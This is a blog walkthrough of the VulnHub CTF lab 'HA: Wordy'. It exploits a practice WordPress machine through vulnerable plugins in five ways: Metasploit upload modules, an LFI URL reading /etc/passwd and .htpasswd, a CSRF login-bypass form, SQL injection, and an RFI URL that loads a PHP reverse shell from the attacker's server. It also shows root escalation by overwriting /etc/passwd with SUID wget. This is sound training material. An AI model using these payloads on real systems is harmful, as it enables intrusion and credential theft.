<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">HA : Wordy Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/ha-wordy-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-09-23T17:05:01+00:00">September 23, 2019</time><time class="updated" datetime="2025-06-10T20:11:06+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">This is our Walkthrough for HA: Wordy‚Äù and this CTF is designed by Hacking Articles Team üòä, hope you will enjoy.</span></p>
<p><span style="color: #000000;">The lab is designed for Beginners for WordPress Penetration Testing Practices. This lab is designed as a Capture the flag and not as a boot to root, but it contains multiple Vulnerabilities (OWASP Top-10) that should be exploited to complete this CTF Challenge. This helps the CTF player to understand all the ways in which a WordPress machine can be vulnerable.</span></p>
<p><span style="color: #000000;"><strong>Level: Easy</strong></span></p>
<p><span style="color: #000000;">You can download this lab from <strong><a style="color: #000000;" href="https://www.vulnhub.com/entry/ha-wordy,363/">here</a></strong>.</span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
<p><span style="color: #000000;"><strong>Network Scanning</strong></span></p>
<ul>
<li><span style="color: #000000;">Host IP (Netdiscover)</span></li>
<li><span style="color: #000000;">Open Port &amp; Services (Nmap)</span></li>
</ul>
<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
<ul>
<li><span style="color: #000000;">Web Directory Brute force (Dirb)</span></li>
<li><span style="color: #000000;">Scanning WordPress (Wpscan)</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploiting Reflex Gallery (1st Method: file Upload)</strong></span></p>
<ul>
<li><span style="color: #000000;">Spawning Shell (Metasploit)</span></li>
<li><span style="color: #000000;">Capture the 1<sup>st</sup> flag</span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation </strong></span></p>
<ul>
<li><span style="color: #000000;">Abusing SUID Binaries</span></li>
<li><span style="color: #000000;">Capture 2<sup>nd</sup> Flag</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploiting Mail_Masta &amp; WP_Support (2nd Method- LFI &amp; CSRF)</strong></span></p>
<ul>
<li><span style="color: #000000;">LFI</span></li>
<li><span style="color: #000000;">CSRF</span></li>
<li><span style="color: #000000;">Capture the flag</span></li>
<li><span style="color: #000000;">Inject PHP malicious code</span></li>
<li><span style="color: #000000;">Spawning Shell (Netcat)</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploiting WP_Symposium (3rd Method: SQL Injection)</strong></span></p>
<ul>
<li><span style="color: #000000;">Web Directory Enumeration (Dirb)</span></li>
<li><span style="color: #000000;">Obtaining Database Info (Metasploit)</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploit Gwolle Guestbook (4th Method: RFI)</strong></span></p>
<ul>
<li><span style="color: #000000;">Inject PHP malicious code</span></li>
<li><span style="color: #000000;">Spawning Shell (Netcat)</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploit Slideshow Gallery (5th Method: Authenticated File_Upload)</strong></span></p>
<ul>
<li><span style="color: #000000;">Spawning Shell (Metasploit)</span></li>
</ul>
<h3><span style="color: #000000;"><strong>Walkthrough</strong></span></h3>
<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
<p><span style="color: #000000;">Starting with netdiscover, to identify host IP address and thus we found 192.168.0.27. let‚Äôs now go for advance network scanning using nmap aggressive scan.</span></p>
<pre class="lang:default decode:true">nmap -A 192.168.0.27</pre>
<p><span style="color: #000000;">We saw from the scan result that the port 80 open which is hosting Apache httpd service.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-DkAsU1ZAwe4/XYjufwT08BI/AAAAAAAAgoI/x7ZNGthy5BktI3aX2YyNCNpNKBGOCRSAwCLcBGAsYHQ/s1600/1.png"/></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">Since we got the port 80 open, we decided to browser the IP Address in the browser but found nothing.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-GxqFnaVUubQ/XYjuisK5QOI/AAAAAAAAgow/qvyK5YAKRK0LyriLP3ZSxAxmwlzWwkKzACLcBGAsYHQ/s1600/2.png"/></p>
<p><span style="color: #000000;">Further, we move for directory enumeration and use dirb for brute-forcing.</span></p>
<pre class="lang:default decode:true">dirb http://192.168.0.27/</pre>
<p><span style="color: #000000;">This gave us a directory called ‚Äúwordpress‚Äù as shown in the given image.</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-TlcC5XHHX4Q/XYjulVAAUhI/AAAAAAAAgpc/5-TeGkt7kuAsGLkXnGsdupJhMJnOkfgpgCLcBGAsYHQ/s1600/3.png"/></strong></span></p>
<p><span style="color: #000000;">Upon finding the directory, we opened the URL in our browser.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-NYPFq1IItq4/XYjuolLj3xI/AAAAAAAAgqA/Gc-ZoGXuZ0AH1YkXnlRfeT1jPs1yXHPiACLcBGAsYHQ/s1600/4.png"/></p>
<p><span style="color: #000000;">Now that we have the wordpress site, it‚Äôs logical to perform a wpscan on our lab.</span></p>
<pre class="lang:default decode:true">wpscan --url http://192.168.0.27/wordpress --enumerate p</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-HIcjdQCThw0/XYjuoqq5_CI/AAAAAAAAgqE/MgzTE7s1PyQbGghvE1uSkBs54pm6haZ-wCLcBGAsYHQ/s1600/5.png"/></p>
<p><span style="color: #000000;">Now we move further down in the wpscan result and found the reflex gallery plugin. It is vulnerable to the File Upload. As you can observe that it has shown Metasploit module for exploiting reflex gallery.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-xyv3_IJnFFc/XYjupAmz72I/AAAAAAAAgqI/a7sUis-gdW01rpuggmuChEnMk7ilVcB1QCLcBGAsYHQ/s1600/6.png"/></p>
<h3><span style="color: #800000;"><strong>Exploiting Reflex Gallery (1<sup>st</sup> Method: file Upload )</strong></span></h3>
<p><span style="color: #000000;">Thus, we use the following module and set the argument such as rhosts and targeturi and then run the exploit to get the meterpreter session.</span></p>
<pre class="lang:default decode:true">msf5 &gt; use exploit/unix/webapp/wp_reflexgallery_file_upload
msf5 &gt; set rhosts 192.168.0.27
msf5 &gt; set targeturi /wordpress
msf5 &gt; exploit</pre>
<p><span style="color: #000000;">Boom!! Here we have our meterpreter session which you can observe in the given below image.</span></p>
<pre class="lang:default decode:true">meterpreter &gt; shell
meterpreter &gt;¬† python3 -c 'import pty; pty.spawn(/"bin/bash")'</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-UZRMwvLDqiQ/XYjupsWl-UI/AAAAAAAAgqM/ENo6RQ9c-Z8iZtqNBVWZMNY8Rw6aiaMWwCLcBGAsYHQ/s1600/7.png"/></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation </strong></span></h3>
<p><span style="color: #000000;">As soon as we gained the proper shell, we enumerated the machine for flags. We found flag1.txt in the /home/raj/ directory</span></p>
<pre class="lang:default decode:true">cd /home
ls
cd raj
ls
cat flag1.txt</pre>
<p><span style="color: #000000;">Now for privilege escalation, It is a regular practice to check for any file having SUID permissions with the help of ‚Äú<em>Find‚Äù</em> command. We used the following command to enumerate all binaries having SUID permissions:</span></p>
<pre class="lang:default decode:true">find / -perm -u=s -type f 2&gt;/dev/null</pre>
<p><span style="color: #000000;">Find command shown that <strong>wget</strong> and <strong>cp</strong> command has the SUID permissions. This could be possible for escalating root privilege.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-mgcvN5Yl49Q/XYjup2tbGeI/AAAAAAAAgqQ/zsPDKjOspII505heL9D2ZdmiIu9KZdY1QCLcBGAsYHQ/s1600/8.png"/></p>
<p><span style="color: #000000;">SUID Binaries command gave us all the sensitive files that can be read/write and hence with the help of wget command we can overwrite the /etc/passwd. ¬†</span></p>
<p><span style="color: #000000;"><em>‚ÄúTo know more how to edit /etc/passwd file read Full-Article from <a style="color: #000000;" href="https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/">article1</a> &amp; <a style="color: #000000;" href="https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/">article2</a>‚Äù.</em></span></p>
<p><span style="color: #000000;">Now we are creating the salt value of password for our new user and this will be done by using ‚Äúopenssl‚Äù following command as mentioned in the screenshot below:</span></p>
<pre class="lang:default decode:true">openssl passwd -1 -salt ignite pass123</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-JNMH3UCzh6I/XYjupx1I4nI/AAAAAAAAgqU/leoKjxBpu3AEYO034T3TuWitxBFCqAnuACLcBGAsYHQ/s1600/9.png"/></p>
<p><span style="color: #000000;">And we will get our hash value something like this: <strong>‚Äú$1$ignite$3eTbJm980Hz.k1NTdNxe1‚Äù</strong>; This is going to help us create an entry of our user in the /etc/passwd file of the target machine. Now we have copied the entire content of /etc/passwd file as shown in the below image in our local machine.</span></p>
<pre class="lang:default decode:true">cd /home/raj
cat /etc/passwd</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-pjT8xLFot1o/XYjufyqJ0HI/AAAAAAAAgoQ/Iut0RKLL7josetYp0gsBHkDnZpvhIJJ-ACLcBGAsYHQ/s1600/11.png"/></p>
<p><span style="color: #000000;">After pasting above copied content, we will edit a new record for the user ‚Äúignite‚Äù then paste the above-copied hash password in the record as shown below.</span></p>
<pre class="lang:default decode:true">cat /etc/passwd</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-HUhv2BvKgMs/XYjuf3u2AkI/AAAAAAAAgoM/IJs1a2k_jfYZ12f_VX42vBXmCR_1MejQwCLcBGAsYHQ/s1600/12.png"/></p>
<p><span style="color: #000000;">Now we want to overwrite passwd file inside /etc folder to replace the original passwd file. We can use wget with -O to download the passwd file from our machine inside a /etc directory which will overwrite the existing passwd file.</span></p>
<pre class="lang:default decode:true">cd /home/raj
cd /etc
wget -O passwd http://192.168.0.16:8000/passwd</pre>
<p><span style="color: #000000;">Now when you check, you will see that the / etc / passwd file has been updated as shown in the image below.</span></p>
<pre class="lang:default decode:true">tail /etc/passwd</pre>
<p><span style="color: #000000;">Now let‚Äôs try to access root shell and we have to switch user as ignite for escalating privileges.</span></p>
<pre class="lang:default decode:true">su ignite
cd /root
ls
cat proof.txt</pre>
<p><span style="color: #000000;">Awesome!! We found the final flag along with root privileges. Let‚Äôs go for the 2<sup>nd</sup> method‚Ä¶‚Ä¶..</span></p>
<h3><img decoding="async" src="https://1.bp.blogspot.com/-7Qskp-wi0j4/XYjugweVRPI/AAAAAAAAgoU/qkeMOr2UaMA5XPDGEVt1GaJH6jMWt1J1gCLcBGAsYHQ/s1600/13.png"/></h3>
<h3><span style="color: #800000;"><strong>Exploiting Mail_Masta &amp; WP_Support (2<sup>nd</sup> Method- LFI &amp; CSRF)</strong></span></h3>
<p><span style="color: #000000;">We can solve the lab using another method as well. Earlier our Wpscan showed us the Mail Masta plugin which is vulnerable to LFI (Local File Inclusion). On exploring the following <a style="color: #000000;" href="https://www.exploit-db.com/exploits/40290">link</a>, we got proof-of-concept would be to load passwd file.</span></p>
<pre class="lang:default decode:true">http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-WhIkcMe-_JE/XYjuhMhfPFI/AAAAAAAAgoY/gSCK2LqX_-kwRsx9XDUiXmdcQ1lG2sMBwCLcBGAsYHQ/s1600/14.png"/></p>
<p><span style="color: #000000;">So, we framed our URL to exploit the LFI It turned out to be like this:</span></p>
<pre class="lang:default decode:true">http://192.168.0.27/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</pre>
<p><span style="color: #000000;">Now we browsed the URL in our browser to find the output of cat command on /etc/passwd file.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/--_PUK5Q0DuA/XYjuhVlkiZI/AAAAAAAAgoc/lqYtucLGXUgxN7kFrZ0cRvNTyj3BA2rlQCLcBGAsYHQ/s1600/15.png"/></p>
<p><span style="color: #000000;">Now after some enumeration, we found that there are some credentials stored inside the /etc/apache2/.htpasswd. So, let‚Äôs read them using curl while exploiting LFI.</span></p>
<pre class="lang:default decode:true">curl http://192.168.0.27/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/.htpasswd</pre>
<p><span style="color: #000000;">We were successful in obtaining a hash. It seemed like Base64 Encryption. We used the base64 command with -d parameter to decode this hash as shown in the image.</span></p>
<pre class="lang:default decode:true">echo "YWFydGk6YWFydGlAZ21haWwuY29t" | base64 -d</pre>
<p><span style="color: #000000;">It turned out to be aarti:aarti@gmail.com. This must be login details but there is no password.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-VF9XAALsTWA/XYjuhb5JZyI/AAAAAAAAgog/G-kRM_pc5OMiuqhui-dmLz7N2AeMOWWwACLcBGAsYHQ/s1600/16.png"/></p>
<p><span style="color: #000000;">Aarti is a member of WordPress and server user account. We can confirm this from our previous assessment of wpscan result. It shows 2 users admin and aarti.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-YFMpK65gAcI/XYjuh3W630I/AAAAAAAAgok/XvYAG8RnRLQ7QflsEXnWIXGyn63WbXzqwCLcBGAsYHQ/s1600/17.png"/></p>
<h3><span style="color: #800000;"><strong>CSRF: WP Support Plus Responsive Ticket</strong></span></h3>
<p><span style="color: #000000;">When we scanned WordPress with wpscan for vulnerable plugins, we found many of them and here, one by one we can exploit them to our desire. To do so, we will use searchsploit in order to find exploits for <strong>wp support</strong> as this was hinted to us during the said scan. Therefore, type the following for this:</span></p>
<pre class="lang:default decode:true">searchsploit wp-support
searchsploit -m 41006
cat 41006.txt</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-yfXlCBNs_1k/XYjuiZOxrhI/AAAAAAAAgoo/MQyRhvu1JSk_dB8G-toB25zysPaMSCVLACLcBGAsYHQ/s1600/18.png"/></p>
<p><span style="color: #000000;">Once the above commands are executed, we will now copy the highlighted content and modify it (as shown in the image below) to change <strong>username </strong>value to ‚Äúaarti‚Äù and <strong>email value</strong> to ‚Äúaarti@gmail.com‚Äù :</span></p>
<pre class="lang:default decode:true">&lt;form method="post" action="http://wp/wp-admin/admin-ajax.php"&gt;
Username: &lt;input type="text" name="username" value="aarti"&gt;
&lt;input type="hidden" name="email" value="aarti@gmail.com"&gt;
&lt;input type="hidden" name="action" value="loginGuestFacebook"&gt;
&lt;input type="submit" value="Login"&gt;
&lt;/form&gt;</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-w3iaVKpCZbc/XYjuiVLGimI/AAAAAAAAgos/9BiXxXHnM70D5sBzVJTZgSMvkeZJCFEoACLcBGAsYHQ/s1600/19.png"/></p>
<p><span style="color: #000000;">As we execute the above script, the webpage will be directed to the log in the screen; asking us the username, which we have already found.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Ik35ljjrdhc/XYjui8Op8UI/AAAAAAAAgo0/i1-178uKfxEYSHy6NjiHUE6SkH_t9sIgQCLcBGAsYHQ/s1600/20.png"/></p>
<p><span style="color: #000000;">Here, as soon as we click on the login button, we will be logged in as a user without entering a password because of incorrect usage of <strong>wp_set_auth_cookie()</strong> due to CSRF vulnerability.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-YABNjEBrHYY/XYjujBFDH6I/AAAAAAAAgo4/KF0Ilw_lZHsJaFTWgFIC0xIGNcanVOUPACLcBGAsYHQ/s1600/21.png"/></p>
<p><span style="color: #000000;">While traversing the website we found a <strong>second flag</strong> and a root password in biographical info.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Q5aUH7t9BOY/XYjujbLNt8I/AAAAAAAAgo8/8d6hqlIBkvIqs01wegoJQ3Q7x5J5QKDVACLcBGAsYHQ/s1600/22.png"/></p>
<p><span style="color: #000000;">The password we found was encoded using the base64 algorithm. To decrypt the password, we used the following command :</span></p>
<pre class="lang:default decode:true">echo "SWduaXRlQDEyMw=="¬† |¬† base64 -d</pre>
<p><span style="color: #000000;">Upon decryption, we found the root password is Ignite@123. This is the password for the admin user in WordPress.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-dX0U8nfmhEw/XYjujnDleQI/AAAAAAAAgpA/CEzxFwY-StMtM9SsidHI50fq0yi4wYFWACLcBGAsYHQ/s1600/23.png"/></p>
<p><span style="color: #000000;">Now, to proceed further we used the PHP reverse shell. We changed the IP Address to our current IP Address and give any port you want and start netcat listener for obtaining a reverse connection.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-4OMVDROdwKk/XYjuj7757tI/AAAAAAAAgpE/EoE9nqeU54kwpGAAz911ezzwAi8s010yQCLcBGAsYHQ/s1600/24.png"/></p>
<p><span style="color: #000000;">And then we copied the above php-reverse-shell and paste it in 404.php template of wordpress as shown in the image below :</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-r7H9v5zoI5Q/XYjukTRPgUI/AAAAAAAAgpI/Bvv8rQvENHY2l9gUMzyJ3_5pcfaPvC0MQCLcBGAsYHQ/s1600/25.png"/></p>
<p><span style="color: #000000;">Then after saving the 404.php file we will run the file through URL in a browser as shown in the image below :</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-c9cnvH_T1HE/XYjukYtKftI/AAAAAAAAgpM/_gbUnk7n7uIk0U1J6SZU80zq6mkpb2czACLcBGAsYHQ/s1600/26.png"/></p>
<p><span style="color: #000000;">Simultaneously, when you run netcat, you will have your session upon execution of 404.php file. Access netcat using the following command :</span></p>
<pre class="lang:default decode:true">nc -lvp 1234</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-17CoGZJhghs/XYjukoLWl3I/AAAAAAAAgpQ/d5_88pB_cagyTJ5zh_VN4utelPMrkt-4QCLcBGAsYHQ/s1600/27.png"/></p>
<h3><span style="color: #800000;"><strong>Exploiting WP_Symposium (3<sup>rd</sup> Method: SQL Injection)</strong></span></h3>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">To further enumerate, we performed a Directory Bruteforce. There are a lot of situations where we need to extract the directories with a specific extension over the target server, and for this, we can use the -X parameter in dirb scan. This parameter accepts the file extension name and then searches the given extension files over the target server or machine. For instance, here we need to find text files, so we will use the following command for it :</span></p>
<pre class="lang:default decode:true">dirb http://192.168.0.27¬† -X .txt</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-6X2Zi9uQ7vc/XYjulOyR6WI/AAAAAAAAgpU/WNWR_mtw264kYjtRomO_IvxB4rpkr1lcACLcBGAsYHQ/s1600/28.png"/></p>
<p><span style="color: #000000;">Among all the text files the message in notes.txt stood out. It said, ‚Äúyou need to zip your way out‚Äù and this message is obviously a hint to look for a zip file.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-YbN1ZX-V7R4/XYjulHi4WCI/AAAAAAAAgpY/VBm0PZMX664iPE2E3iYKE5LMUAKBK7s1gCLcBGAsYHQ/s1600/29.png"/></p>
<p><span style="color: #000000;">Now, again we will use dirb -X extension to find zip.</span></p>
<pre class="lang:default decode:true">dirb http://192.168.0.27 -X .zip</pre>
<p><span style="color: #000000;">Upon finding a zip file and then we download the file using the following wget and then unzip the command:</span></p>
<pre class="lang:default decode:true">wget http://192.168.0.27/secret.zip
unzip secret.zip</pre>
<p><span style="color: #000000;">To unzip the file successfully, you will need a password because it was a password protected zip file, but as we don‚Äôt know the said password, we will try to exploit a plugin.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-o0081MVoSb0/XYjul-cguzI/AAAAAAAAgpg/cRVeAET3cLIg7KBtpKIblkVkyruN1fvvACLcBGAsYHQ/s1600/30.png"/></p>
<p><span style="color: #000000;">We will use WordPress plugin <strong>wp-symposium version 15.5.1</strong> which allows retrieving all the database content, which includes users‚Äô details and password.</span></p>
<p><span style="color: #000000;">Luckily, we found exploit for this vulnerability inside Metasploit framework and thus load the below module and execute the following command</span></p>
<pre class="lang:default decode:true">use auxiliary/admin/http/wp_symposium_sql_injection
msf auxiliary(wp_symposium_sql_injection) &gt; set rhosts 192.168.0.27
msf auxiliary(wp_symposium_sql_injection) &gt; set targeturi /wordpress
msf auxiliary(wp_symposium_sql_injection) &gt; exploit</pre>
<p><span style="color: #000000;">Nice!!! Here we found the relevant username and email id as user: admin and aarti respectively.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Q3EpTkw7Gts/XYjumGpDI6I/AAAAAAAAgpk/EQbu24KXpskZwNFX684l8etX8tEIJav8ACLcBGAsYHQ/s1600/31.png"/></p>
<p><span style="color: #000000;">Now will unzip the file we found earlier that is secret.zip with hash we found in wp-symposium exploit.</span></p>
<pre class="lang:default decode:true">cat link.txt</pre>
<p><span style="color: #000000;">As soon as we unzip the file, we found that this lab can be solved with multiple ways with the list of exploits.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-asOd-FnjNAM/XYjumJBiQaI/AAAAAAAAgpo/RUD0V2jQz6YuS5VzM7jchkZJjRo_U5zegCLcBGAsYHQ/s1600/32.png"/></p>
<h3><span style="color: #800000;"><strong>Exploit Gwolle Guestbook (4<sup>th</sup> Method: RFI)</strong></span></h3>
<p><span style="color: #000000;">Now again we will run wpscan to enumerate the themes and plugins and find a vulnerable plugin called ‚ÄúGwolle Guestbook‚Äù. We search for the exploit and find that it is vulnerable to Remote File Inclusion (RFI).</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-pXpxlgPAeiY/XYjum_SQBYI/AAAAAAAAgps/IRyaT6CKZ5UnwxCoxdoXeGg45KOWSRrnwCLcBGAsYHQ/s1600/33.1.png"/></p>
<p><span style="color: #000000;">We will follow the instructions according to the given POC on exploit-db and use the php-reverse-shell.php available on Kali Linux. We will copy it to desktop and rename it to <strong>wp-load.php</strong>. To execute our PHP shell using RFI we will start our python HTTP server to exploit RFI on the target machine.</span></p>
<pre class="lang:default decode:true">mv php-reverse-shell.php shell.phpwp-load.php
python -m SimpleHTTPServer</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Vw6gSulT1Y8/XYjumriZODI/AAAAAAAAgpw/8OAPcuzLRaIUSrl67FS4CMqLrPRqZy6RACLcBGAsYHQ/s1600/33.png"/></p>
<p><span style="color: #000000;">We set up our listener using netcat; as soon as we execute our php shell through RFI, we are successfully able to get a reverse shell.</span></p>
<pre class="lang:default decode:true">http://192.168.0.27/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://192.168.0.27:8000/shell.php</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Sf_Lbn0gSfA/XYjum-a79aI/AAAAAAAAgp0/xwYGdm-HH3cDcN5tFLpfVRrmkV1-XsMlQCLcBGAsYHQ/s1600/34.png"/></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-L32gevqQZSA/XYjundGg0kI/AAAAAAAAgp4/TKy9unirZTsiGIdIlOGtFTvM_JU4NKcxwCLcBGAsYHQ/s1600/35.png"/></p>
<h3><span style="color: #800000;"><strong>Exploit Slideshow Gallery (5<sup>th</sup> Method: Authenticated File_Upload)</strong></span></h3>
<p><span style="color: #000000;">Now we will exploit another vulnerable plugin that we found in secret.zip. The WordPress Slideshow Gallery plugin contains an authenticated file upload vulnerability. An attacker can upload arbitrary files to the upload folder. Since the plugin uses its own file upload mechanism instead of the WordPress API, it‚Äôs possible to upload any file type.</span></p>
<h3><span style="color: #000000;"><strong>Metasploit</strong></span></h3>
<p><span style="color: #000000;">You will get exploit for this vulnerability inside Metasploit framework and thus load the below module and execute the following command:</span></p>
<pre class="lang:default decode:true">use exploit/unix/webapp/wp_slideshowgallery_upload
set targeturi /wordpress
set rhosts 192.168.0.27
set wp_user admin
set wp_password Ignite@123
exploit</pre>
<p><span style="color: #000000;">As the above commands are executed, you will have your meterpreter session. Just as portrayed in this article, there are multiple methods to exploit a WordPress platformed website.</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-dRVdD8H6QwU/XYjuoP0gEzI/AAAAAAAAgp8/n7xvUloeB9EMF5Oi5cp2yf4wGFExT1qpQCLcBGAsYHQ/s1600/36.png"/></strong></span></p>
<p><span style="color: #000000;"><strong>Author: Japneet Kaur Gandhi¬†</strong>is a Technical Writer, Researcher and Penetration Tester.</span><strong><span style="color: #000000;">¬†Contac</span>t¬†</strong><a href="https://www.linkedin.com/in/japneet-gandhi/"><strong>here</strong></a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
